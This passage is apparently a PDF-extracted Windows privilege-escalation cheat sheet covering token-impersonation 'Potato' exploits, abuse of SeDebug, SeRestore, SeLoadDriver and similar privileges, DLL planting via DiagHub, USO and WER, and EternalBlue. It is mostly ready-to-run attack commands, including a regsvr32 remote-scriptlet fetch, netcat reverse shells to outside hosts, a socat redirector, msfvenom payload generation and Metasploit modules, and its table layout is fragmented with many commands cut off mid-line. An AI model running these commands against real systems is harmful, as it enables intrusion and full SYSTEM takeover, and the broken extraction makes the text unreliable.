Have functionality that would be useful to an APT or red team
wmic.exe process call create calc
regsvr32 /s /n /u /i:https://tinyurl.com/2a8yook3 scrobj.dll
Microsoft.Workflow.Compiler.exe tests.xml results.xml

EoP - Impersonation Privileges
Full privileges cheatsheet at https://tinyurl.com/2cv7an8v summary below will only list direct
ways to exploit the privilege to obtain an admin session or read sensitive files.
Privilege

Impact

Tool

Execution path

Remark

"It would allow a user
to impersonate tokens
SeAssignPrimaryToken

Admin

3rd party
tool

and privesc to nt
system using tools
such as potato.exe,
rottenpotato.exe and

Thank you Auréli

for the update. I
re-phrase it to so

more recipe-like

juicypotato.exe"

- May be more in
if you can read

%WINDIR%\MEM

- SeBackupPriv

SeBackup

Threat

Built-in
commands

Read sensitve files
with robocopy /b

(and robocopy) i
helpful when it c
open files.

- Robocopy requ

SeBackup and S
to work with /b p

SeCreateToken

Admin

3rd party

Create arbitrary token
including local admin

tool

rights with
NtCreateToken .

SeDebug

Admin

PowerShell

Duplicate the

Script to be foun

lsass.exe token.

FuzzySecurity

1. Load buggy kernel
driver such as
szkg64.sys or
capcom.sys

SeLoadDriver

Admin

2. Exploit the driver

1. The szkg64

vulnerability

vulnerability is lis
CVE-2018-15732

Alternatively, the
privilege may be used

2. The szkg64
code was create

to unload security-

Parvez Anwar

3rd party
tool

related drivers with
ftlMC builtin
command. i.e.: fltMC
sysmondrv

1. Launch
PowerShell/ISE with
the SeRestore
privilege present.
2. Enable the privilege

Attack may be de

some AV softwar

with EnableSeRestore

Admin

PowerShell

SeRestorePrivilege).
3. Rename utilman.exe

Alternative meth
on replacing serv

to utilman.old
4. Rename cmd.exe to

binaries stored in

utilman.exe

"Program Files"
same privilege.

5. Lock the console
and press Win+U
1. takeown.exe /f
"%windir%\system32"

2. icalcs.exe

Attack may be de
some AV softwar

"%windir%\system32"
SeTakeOwnership

Admin

Built-in

/grant

Alternative meth

commands

"%username%":F

3. Rename cmd.exe to

on replacing serv
binaries stored in

utilman.exe

"Program Files"

4. Lock the console
and press Win+U

same privilege.

Manipulate tokens to

SeTcb

Admin

3rd party
tool

have local admin
rights included. May
require
SeImpersonate.
To be verified.

Restore A Service Account's Privileges
This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.
# https://tinyurl.com/24szthec
c:\TOOLS>FullPowers
[+] Started dummy thread with id 9976
[+] Successfully created scheduled task.
[+] Got new token! Privilege count: 7
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.
C:\WINDOWS\system32>whoami /priv
PRIVILEGES INFORMATION
---------------------Privilege Name
Description
State
============================= ========================================= =======
SeAssignPrimaryTokenPrivilege Replace a process level token
Enabled
SeIncreaseQuotaPrivilege
Adjust memory quotas for a process
Enabled
SeAuditPrivilege
Generate security audits
Enabled

SeChangeNotifyPrivilege
Bypass traverse checking
Enabled
SeImpersonatePrivilege
Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege
Create global objects
Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set
Enabled
c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z

Meterpreter getsystem and alternatives
meterpreter> getsystem
Tokenvator.exe getsystem cmd.exe
incognito.exe execute -c "NT AUTHORITY\SYSTEM" cmd.exe
psexec -s -i cmd.exe
python getsystem.py # from https://tinyurl.com/2dcqakre

RottenPotato (Token Impersonation)
Binary available at : foxglovesec/RottenPotato and breenmachine/RottenPotatoNG
Exploit using Metasploit with incognito mode loaded.
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"

Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -

Juicy Potato (Abusing the golden privileges)
If the machine is >= Windows 10 1809 & Windows Server 2019 - Try Rogue Potato
If the machine is < Windows 10 1809 < Windows Server 2019 - Try Juicy Potato
Binary available at : ohpe/juicy-potato
1. Check the privileges of the service account, you should look for SeImpersonate and/or
SeAssignPrimaryToken (Impersonate a client after authentication)

whoami /priv

2. Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that
identifies a COM class object
Windows 7 Enterprise
Windows 8.1 Enterprise
Windows 10 Enterprise
Windows 10 Professional
Windows Server 2008 R2 Enterprise
Windows Server 2012 Datacenter
Windows Server 2016 Standard
3. Execute JuicyPotato to run a privileged command.

JuicyPotato.exe -l 9999 -p c:\interpub\wwwroot\upload\nc.exe -a "IP PORT -e cmd.
JuicyPotato.exe -l 1340 -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86
JuicyPotato.exe -l 1337 -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-9994Testing {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4} 1337
......
[+] authresult 0
{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
[+] CreateProcessWithTokenW OK

Rogue Potato (Fake OXID Resolver)
Binary available at antonioCoco/RoguePotato

# Network redirector / port forwarder to run on your remote machine, must use port 1
socat tcp-listen:135,reuseaddr,fork tcp:10.0.0.3:9999

# RoguePotato without running RogueOxidResolver locally. You should run the RogueOxi
# Use this if you have fw restrictions.
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe"
# RoguePotato all in one with RogueOxidResolver running locally on port 9999
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999

#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and spec
RoguePotato.exe -r 10.0.0.3 -e "C:\windows\system32\cmd.exe" -l 9999 -c "{6d8ff8e1-7

EFSPotato (MS-EFSR EfsRpcOpenFileRaw)
Binary available at https://tinyurl.com/23dbbqvr
# .NET 4.x
csc EfsPotato.cs
csc /platform:x86 EfsPotato.cs
# .NET 2.0/3.5
C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe EfsPotato.cs
C:\Windows\Microsoft.Net\Framework\V3.5\csc.exe /platform:x86 EfsPotato.cs

JuicyPotatoNG
antonioCoco/JuicyPotatoNG

JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami" > C:\juicypot

EoP - Privileged File Write
DiagHub
:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary
DLLs.
The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects
trace information and is programmatically exposed via DCOM. This DCOM object can be used to
load a DLL into a SYSTEM process, provided that this DLL exists in the C:\Windows\System32
directory.
Exploit
1. Create an evil DLL e.g: payload.dll and move it into C:\Windows\System32
2. Build https://tinyurl.com/2xlyyjuz
3. diaghub.exe c:\\ProgramData\\ payload.dll
The default payload will run C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 e cmd.exe

Alternative tools:

https://tinyurl.com/2b7rwrc6
https://tinyurl.com/2dfj95aj

UsoDLLLoader
:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10
Insider Preview.
An alternative to the DiagHub DLL loading "exploit" found by James Forshaw (a.k.a.
@tiraniddo)
If we found a privileged file write vulnerability in Windows or in some third-party software, we
could copy our own version of windowscoredeviceinfo.dll into C:\Windows\Sytem32\ and
then have it loaded by the USO service to get arbitrary code execution as NT
AUTHORITY\System.
Exploit
1. Build https://tinyurl.com/29rz3v7r
Select Release config and x64 architecure.
Build solution.
DLL .\x64\Release\WindowsCoreDeviceInfo.dll
Loader .\x64\Release\UsoDllLoader.exe.
2. Copy WindowsCoreDeviceInfo.dll to C:\Windows\System32\
3. Use the loader and wait for the shell or run usoclient StartInteractiveScan and
connect to the bind shell on port 1337.

WerTrigger
Exploit Privileged File Writes bugs with Windows Problem Reporting
1. Clone https://tinyurl.com/269v4hov
2. Copy phoneinfo.dll to C:\Windows\System32\
3. Place Report.wer file and WerTrigger.exe in a same directory.
4. Then, run WerTrigger.exe .
5. Enjoy a shell as NT AUTHORITY\SYSTEM

WerMgr
Exploit Privileged Directory Creation Bugs with Windows Error Reporting

nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17–010 <ip_netblock>

Metasploit modules to exploit EternalRomance/EternalSynergy/EternalChampion .

auxiliary/
admin/smb/ms17_010_command
MS17-010 EternalRomance/EternalSynergy/EternalCh
auxiliary/
scanner/smb/smb_ms17_010
MS17-010 SMB RCE Detection
exploit/
windows/smb/ms17_010_eternalblue
MS17-010 EternalBlue SMB Remote Windows Kernel
exploit/
windows/smb/ms17_010_eternalblue_win8 MS17-010 EternalBlue SMB Remote Windows Kernel
exploit/
windows/smb/ms17_010_psexec
MS17-010 EternalRomance/EternalSynergy/Eternal

If you can't use Metasploit and only want a reverse shell.
git clone https://tinyurl.com/2ccy84d8

# generate a simple reverse shell to use
msfvenom -p windows/shell_reverse_tcp LHOST=$ip LPORT=443 EXITFUNC=thread -f
python2 send_and_execute.py 10.0.0.1 revshell.exe

CVE-2019-1388
Exploit : https://tinyurl.com/26vn372z
Requirement:
Windows 7
Windows 10 LTSC 10240
Failing on :
LTSC 2019
1709
1803
Detailed information about the vulnerability : https://tinyurl.com/svj5y3v

References

icacls - Docs Microsoft
Privilege Escalation Windows - Philip Linghammar
Windows elevation of privileges - Guifre Ruiz
The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte
Basic Linux Privilege Escalation
Windows Privilege Escalation Fundamentals
TOP–10 ways to boost your privileges in Windows systems - hackmag
The SYSTEM Challenge
Windows Privilege Escalation Guide - absolomb's security blog
Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs
Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability September 18th, 2016 - Robert Russell
Pentestlab.blog - WPE-01 - Stored Credentials
Pentestlab.blog - WPE-02 - Windows Kernel
Pentestlab.blog - WPE-03 - DLL Injection
Pentestlab.blog - WPE-04 - Weak Service Permissions
Pentestlab.blog - WPE-05 - DLL Hijacking
Pentestlab.blog - WPE-06 - Hot Potato
Pentestlab.blog - WPE-07 - Group Policy Preferences
Pentestlab.blog - WPE-08 - Unquoted Service Path
Pentestlab.blog - WPE-09 - Always Install Elevated
Pentestlab.blog - WPE-10 - Token Manipulation
Pentestlab.blog - WPE-11 - Secondary Logon Handle
Pentestlab.blog - WPE-12 - Insecure Registry Permissions
Pentestlab.blog - WPE-13 - Intel SYSRET
Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @xpn
Living Off The Land Binaries and Scripts (and now also Libraries)
Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec
Local Privilege Escalation Workshop - Slides.pdf - @sagishahar
Abusing Diaghub - xct - March 07, 2019
Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege James Forshaw, Project Zero - Wednesday, April 18, 2018
Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19,
2019
Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para

Windows
Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO
Universal Privilege Escalation and Persistence – Printer - AUGUST 2, 2021)
ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS
- March 17, 2022 | Simon Zuckerbraun
Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian
Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code
IN THE POTATO FAMILY, I WANT THEM ALL - @BlWasp_
Potatoes - Windows Privilege Escalation - Jorge Lajara - November 22, 2020

